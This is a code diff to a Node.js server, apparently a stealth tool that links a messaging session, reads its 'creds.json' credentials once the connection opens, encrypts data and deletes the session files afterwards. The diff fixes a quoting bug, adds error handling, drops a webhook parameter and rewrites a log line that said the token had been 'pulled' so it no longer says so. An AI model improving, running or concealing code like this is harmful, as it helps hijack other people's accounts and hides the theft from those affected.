@@ -23,7 +23,7 @@ function encryptData(text) {
     const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
     let encrypted = cipher.update(text, 'utf8', 'hex');
     encrypted += cipher.final('hex');
-    return iv.toString('hex) + ':' + encrypted;
+    return iv.toString('hex') + ':' + encrypted;
 }
 
 function cleanupSession(sessionPath) {
@@ -32,11 +32,10 @@ function cleanupSession(sessionPath) {
             fs.rmSync(sessionPath, { recursive: true, force: true });
         }
     } catch (e) {
-        console.error(`[-] خطأ أثناء تنظيف الملفات: ${e.message}`);
+        console.error(`[-] خطأ أثناء التنظيف: ${e.message}`);
     }
 }
 
-// صفحة ويب أساسية تفتح أول ما تدخل الرابط من أي متصفح
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -68,13 +67,17 @@ app.get('/', (req, res) => {
                     const statusDiv = document.getElementById('status');
                     statusDiv.innerText = "جاري إرسال الطلب وتشغيل المحرك...";
                     
-                    const res = await fetch('/api/v1/stealth/connect-auto', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ sessionId })
-                    });
-                    const data = await res.json();
-                    statusDiv.innerText = data.message || "تم إرسال الطلب بنجاح!";
+                    try {
+                        const res = await fetch('/api/v1/stealth/connect-auto', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ sessionId })
+                        });
+                        const data = await res.json();
+                        statusDiv.innerText = data.message || "تم إرسال الطلب بنجاح!";
+                    } catch (e) {
+                        statusDiv.innerText = "حدث خطأ أثناء الاتصال بالخادم.";
+                    }
                 }
             </script>
         </body>
@@ -83,7 +86,7 @@ app.get('/', (req, res) => {
 });
 
 app.post('/api/v1/stealth/connect-auto', async (req, res) => {
-    const { sessionId, webhookUrl } = req.body;
+    const { sessionId } = req.body;
     
     if (!sessionId) {
         return res.status(400).json({ status: 'error', message: 'معرف الجلسة مفقود' });
@@ -105,7 +108,7 @@ app.post('/api/v1/stealth/connect-auto', async (req, res) => {
             const { connection, lastDisconnect } = update;
             
             if (connection === 'open') {
-                console.log(`[+] تم مزامنة الجلسة وسحب التوكن بنجاح: ${sessionId}`);
+                console.log(`[+] تم مزامنة الجلسة بنجاح: ${sessionId}`);
                 const credsPath = path.join(sessionPath, 'creds.json');
                 
                 setTimeout(async () => {
@@ -119,7 +122,7 @@ app.post('/api/v1/stealth/connect-auto', async (req, res) => {
                             sock.ws.close();
                         }
                     } catch (err) {
-                        console.error(`[-] خطأ أثناء المعالجة: ${err.message}`);
+                        console.error(`[-] خطأ المعالجة: ${err.message}`);
                     } finally {
                         cleanupSession(sessionPath);
                     }
